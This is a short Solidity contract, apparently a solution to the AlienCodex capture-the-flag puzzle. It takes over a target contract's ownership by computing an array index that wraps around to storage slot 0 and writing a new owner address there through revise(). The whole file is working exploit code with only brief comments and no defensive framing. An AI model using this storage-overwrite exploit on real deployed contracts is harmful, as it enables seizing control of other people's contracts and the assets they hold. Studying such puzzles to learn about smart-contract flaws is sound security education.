pragma solidity ^0.5.0;

interface IAlienCodex {
    function revise(uint256 i, bytes32 _content) external;
}

contract AlienExploit {
    function exploit(address target, address newOwner) public {
        // Calculate the storage slot of the dynamic array
        uint256 arraySlot = uint256(keccak256(abi.encode(uint256(1))));
        // Calculate the index that wraps around to slot 0
        uint256 index = uint256(-1) - arraySlot + 1;
        // Convert newOwner address to bytes32
        bytes32 ownerBytes = bytes32(uint256(newOwner));
        // Call revise to overwrite the owner
        IAlienCodex(target).revise(index, ownerBytes);
    }
}